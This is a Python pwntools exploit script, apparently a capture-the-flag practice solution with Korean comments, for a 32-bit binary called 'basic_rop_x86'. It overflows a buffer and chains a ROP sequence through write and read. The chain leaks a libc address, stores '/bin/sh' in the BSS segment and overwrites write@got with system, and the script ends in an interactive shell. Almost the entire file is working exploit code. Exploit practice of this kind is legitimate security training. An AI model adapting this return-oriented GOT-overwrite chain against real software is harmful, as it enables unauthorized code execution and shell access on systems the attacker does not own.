from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x080486e4
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './basic_rop_x86'
# This will automatically get context arch, bits, os etc
e = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
libc = ELF('./libc.so.6')
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

pppr = 0x8048689
bss = e.bss()


# [2] Exploit
payload = b'A' * 72


# read() 실제 주소 흭득 -> write(1, read@got, 4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


# BSS 영역에 "/bin/sh" 쓰기 -> read(0, bss, 8)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)


# got overwrite (write -> system) => read(0, write@got, 4)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)


# write("/bin/sh") => system("/bin/sh")가 호출 됨
payload += p32(write_plt)
payload += b"AAAA"
payload += p32(bss)

io.send(payload)

io.recvuntil(b'A' * 64)
read = u32(io.recvn(4))
lb = read - read_offset
system = lb + system_offset

print("libc base", hex(lb))
print("read", hex(read))
print("system", hex(system))

io.send(b'/bin/sh\x00')
io.sendline(p32(system))
io.interactive()